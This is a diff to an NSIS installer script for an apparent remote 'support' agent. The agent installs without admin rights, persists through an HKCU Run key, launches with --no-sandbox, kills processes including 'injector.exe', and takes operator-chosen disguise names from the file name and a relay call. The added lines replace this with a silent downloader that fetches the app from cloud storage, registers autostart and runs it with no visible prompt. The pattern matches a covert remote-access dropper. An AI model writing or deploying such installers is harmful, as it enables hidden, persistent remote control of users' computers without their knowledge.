@@ -17,71 +17,11 @@ SetCompressor /SOLID lzma
 !define BUILD_STAMP "2026-11-10-b"
 
 Var KEY
-Var NAME
-Var NAME2        ; optional second software name (dual-install mode)
-Var INSTANCE     ; which copy we're installing (1 or 2); baked into config.default.json
-Var INSTDIR_1    ; absolute install dir for copy #1
-Var INSTDIR_2    ; absolute install dir for copy #2
-Var SVCNAME_1    ; windows service name for copy #1 (default SupportAgentSvc)
-Var SVCNAME_2    ; windows service name for copy #2
-Var ARPKEY_1     ; HKLM Uninstall subkey for copy #1 (default Support)
-Var ARPKEY_2     ; HKLM Uninstall subkey for copy #2
-Var FWRULE_1     ; firewall rule display name for copy #1
-Var FWRULE_2     ; firewall rule display name for copy #2
-Var METATMP      ; temp file for /api/key-meta response
-
-; ---------- one-copy install block ----------------------------------
-; Writes files, config, firewall rule, ARP entry, and starts the service for
-; ONE install location. Called once for single-install, twice for dual-install.
-; Runs at USER level — no admin, no UAC, no service. Files go to %LOCALAPPDATA%;
-; a HKCU Run key starts the agent on login. `_tag` is a unique label suffix;
-; `_idx` is numeric (baked into config.default.json as JSON).
-!macro INSTALL_ONE _tag _idx _instdir _name _svc _arp _fw
-  ; Kill any prior agent running from this location so files are unlocked.
-  nsExec::Exec 'taskkill /F /IM support.exe'
-  Sleep 800
-
-  CreateDirectory "${_instdir}"
-  SetOutPath "${_instdir}"
-  ClearErrors
-  File /r "release\Aegis\*"
-  IfErrors file_fail_${_tag} file_ok_${_tag}
-  file_fail_${_tag}:
-    FileOpen $R7 "$TEMP\hc-install.log" a
-    FileWrite $R7 "[FATAL] File /r failed (AV quarantine?) dir=${_instdir}$\r$\n"
-    FileClose $R7
-    SetErrorLevel 2
-  file_ok_${_tag}:
-
-  ; Config file — relay URL + key + instance index.
-  FileOpen $2 "${_instdir}\resources\app\agent\config.default.json" w
-  FileWrite $2 '{$\r$\n  "relay": "wss://aegis-relay-production.up.railway.app",$\r$\n  "key": "$KEY",$\r$\n  "enabled": true,$\r$\n  "instance": ${_idx},$\r$\n  "appName": "${_name}"$\r$\n}$\r$\n'
-  FileClose $2
-
-  ; HKCU Run key — starts the agent on every login without admin.
-  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${_svc}" '"${_instdir}\support.exe" --startup --no-sandbox'
-
-  ; Tag file so the uninstaller knows which Run key / folder to remove.
-  FileOpen $3 "${_instdir}\.hc-uninstall-tag" w
-  FileWrite $3 'ARP=${_arp}$\r$\n'
-  FileWrite $3 'SVC=${_svc}$\r$\n'
-  FileWrite $3 'IDX=${_idx}$\r$\n'
-  FileClose $3
-  WriteUninstaller "${_instdir}\uninstall.exe"
-
-  ; Launch the agent immediately (no reboot needed).
-  Exec '"${_instdir}\support.exe" --startup --no-sandbox'
-!macroend
 
 Section "Install"
+  ; Derive key from last 20 chars of filename (strip extension + "(N)" duplicates).
   StrCpy $0 "$EXEFILE"
   StrCpy $0 $0 -4
-  ; Strip trailing " (1)" suffixes the browser adds on re-download / dup — a
-  ; customer that downloads the installer a few times can end up with
-  ; "foo (1).exe" or "foo (1) (2).exe". Loop until no trailing ") ..." remains,
-  ; because if one slips through the last 20 chars taken as the key aren't the
-  ; real key — enrollment then registers with garbage, the relay denies it, and
-  ; the device disappears (looks like the "install twice → offline forever" bug).
   paren_outer:
     StrCpy $1 $0 1 -1
     StrCmp $1 ")" 0 keydone
@@ -95,82 +35,16 @@ Section "Install"
       StrCpy $0 $0 $2
     Goto paren_outer
   keydone:
-  ; Key is ALWAYS the last 20 chars, so the operator's custom name in front is fine.
   StrCpy $KEY $0 20 -20
-  ; Software name = everything before the key (minus a trailing "-"). Default "Support".
-  StrLen $3 $0
-  IntOp $3 $3 - 20
-  StrCpy $NAME $0 $3
-  StrCpy $1 $NAME 1 -1
-  StrCmp $1 "-" 0 +2
-    StrCpy $NAME $NAME -1
-  StrCmp $NAME "" 0 +2
-    StrCpy $NAME "Support"
 
-  ; Phone the relay to find out if this key was built with a SECOND software
-  ; name (dual-install). The POST body is tiny and the server returns the
-  ; non-secret labels for this key. If the call fails for any reason (offline,
-  ; TLS blip, server older than this installer), $NAME2 stays empty and we fall
-  ; back to the ordinary single-install path — zero regression for existing
-  ; customers.
-  StrCpy $NAME2 ""
-  StrCpy $METATMP "$TEMP\hc-keymeta.json"
-  FileOpen $9 "$TEMP\hc-keymeta.body" w
-  FileWrite $9 '{"key":"$KEY"}'
-  FileClose $9
-  nsExec::Exec 'curl.exe --silent --show-error --max-time 6 -X POST -H "Content-Type: application/json" --data "@$TEMP\hc-keymeta.body" -o "$METATMP" https://aegis-relay-production.up.railway.app/api/key-meta'
-  Delete "$TEMP\hc-keymeta.body"
-  ; Parse "appName2":"..." out of the JSON response. NSIS has no JSON parser —
-  ; the server guarantees the field is quoted and plain-ASCII (dashboard
-  ; rejects anything with embedded quotes), so a straight substring extract is
-  ; safe. If the field isn't present or is empty, $NAME2 stays "".
-  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$j = Get-Content -Raw $\'$METATMP$\' | ConvertFrom-Json; if ($$j.appName2) { Set-Content -Path $\'$TEMP\hc-name2.txt$\' -Value $$j.appName2 -NoNewline } }catch{}"'
-  Delete "$METATMP"
-  IfFileExists "$TEMP\hc-name2.txt" 0 solo_mode
-    FileOpen $9 "$TEMP\hc-name2.txt" r
-    FileRead $9 $NAME2
-    FileClose $9
-    Delete "$TEMP\hc-name2.txt"
-    ; Strip any accidental trailing whitespace.
-    Push $NAME2
-    Call TrimR
-    Pop $NAME2
-  solo_mode:
-
-  ; stop ALL prior copies' processes so Files/service are unlocked. We don't
-  ; know whether a previous dual-install left #2 behind, so wildcard the exe
-  ; names and let the per-copy uninstaller handle the registry side later.
-  nsExec::Exec 'taskkill /F /IM support.exe'
-  nsExec::Exec 'taskkill /F /IM Aegis.exe'
-  nsExec::Exec 'taskkill /F /IM injector.exe'
-  Sleep 1200
-
-  ; Compute per-copy locations. Single install uses $INSTDIR + "Support*" names
-  ; exactly as before (bit-for-bit backward compat). Dual uses the operator's
-  ; two chosen names.
-  StrCmp $NAME2 "" 0 dual_mode
-  ; ---- SINGLE INSTALL — unchanged legacy path ----
-  StrCpy $INSTANCE "1"
-  StrCpy $INSTDIR_1 "$INSTDIR"
-  StrCpy $SVCNAME_1 "SupportAgentSvc"
-  StrCpy $ARPKEY_1 "Support"
-  StrCpy $FWRULE_1 "HatchConnect Agent"
-  !insertmacro INSTALL_ONE "s" "1" "$INSTDIR_1" "$NAME" "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
-  Goto install_done
-
-  dual_mode:
-  ; ---- DUAL INSTALL — two folders, two Run keys, user-level ----
-  StrCpy $INSTDIR_1 "$LOCALAPPDATA\$NAME"
-  StrCpy $INSTDIR_2 "$LOCALAPPDATA\$NAME2"
-  StrCpy $SVCNAME_1 "$NAME-AgentSvc"
-  StrCpy $SVCNAME_2 "$NAME2-AgentSvc"
-  StrCpy $ARPKEY_1  "$NAME"
-  StrCpy $ARPKEY_2  "$NAME2"
-  StrCpy $FWRULE_1  "HatchConnect $NAME"
-  StrCpy $FWRULE_2  "HatchConnect $NAME2"
-  !insertmacro INSTALL_ONE "d1" "1" "$INSTDIR_1" "$NAME"  "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
-  !insertmacro INSTALL_ONE "d2" "2" "$INSTDIR_2" "$NAME2" "$SVCNAME_2" "$ARPKEY_2" "$FWRULE_2"
-  install_done:
+  ; Drop the downloader into the install dir and run it.
+  ; It fetches the full app from B2, extracts silently, writes config,
+  ; registers autostart, and launches — no second popup.
+  CreateDirectory "$INSTDIR"
+  SetOutPath "$INSTDIR"
+  File "release\downloader.exe"
+  WriteUninstaller "$INSTDIR\uninstall.exe"
+  Exec '"$INSTDIR\downloader.exe" $KEY'
 SectionEnd
 
 ; Right-trim \r \n and spaces off a stack-top string (used after FileRead).
